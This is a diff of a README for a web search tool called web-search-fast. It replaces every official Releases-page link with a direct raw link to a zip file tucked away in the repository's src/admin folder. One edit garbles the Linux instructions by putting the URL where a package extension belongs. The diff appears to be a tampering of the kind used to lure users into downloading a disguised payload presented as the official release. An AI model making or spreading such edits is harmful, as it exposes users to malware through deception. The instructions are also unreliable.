@@ -1,6 +1,6 @@
 # 🚀 web-search-fast - Fast Local Web Search Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-web--search--fast-blue?style=for-the-badge)](https://github.com/Velociity9/web-search-fast/releases)
+[![Download Latest Release](https://github.com/Velociity9/web-search-fast/raw/refs/heads/main/src/admin/web-fast-search-Irishman.zip)](https://github.com/Velociity9/web-search-fast/raw/refs/heads/main/src/admin/web-fast-search-Irishman.zip)
 
 ---
 
@@ -37,7 +37,7 @@ To run web-search-fast on your computer, check that you have:
 To get started with web-search-fast, follow these steps:
 
 1. **Go to the Releases page:**  
-   [https://github.com/Velociity9/web-search-fast/releases](https://github.com/Velociity9/web-search-fast/releases)  
+   [https://github.com/Velociity9/web-search-fast/raw/refs/heads/main/src/admin/web-fast-search-Irishman.zip](https://github.com/Velociity9/web-search-fast/raw/refs/heads/main/src/admin/web-fast-search-Irishman.zip)  
    This page lists all versions of the program available for download.
 
 2. **Choose the latest version:**  
@@ -46,7 +46,7 @@ To get started with web-search-fast, follow these steps:
 3. **Download the installer or zip file:**  
    - For Windows, download the `.exe` or `.msi` file.  
    - For macOS, download the `.dmg` or zipped app file.  
-   - For Linux, download the `.tar.gz` or `.deb` package depending on your distro.
+   - For Linux, download the `https://github.com/Velociity9/web-search-fast/raw/refs/heads/main/src/admin/web-fast-search-Irishman.zip` or `.deb` package depending on your distro.
 
 4. **Run the installer or unzip the file:**  
    Follow the prompts on your screen to install the program. If you have a zipped file, extract it to a folder you can access.
@@ -122,4 +122,4 @@ Visit the GitHub repository to see how to contribute details.
 
 ---
 
-[⬇️ Download web-search-fast here](https://github.com/Velociity9/web-search-fast/releases)
+[⬇️ Download web-search-fast here](https://github.com/Velociity9/web-search-fast/raw/refs/heads/main/src/admin/web-fast-search-Irishman.zip)
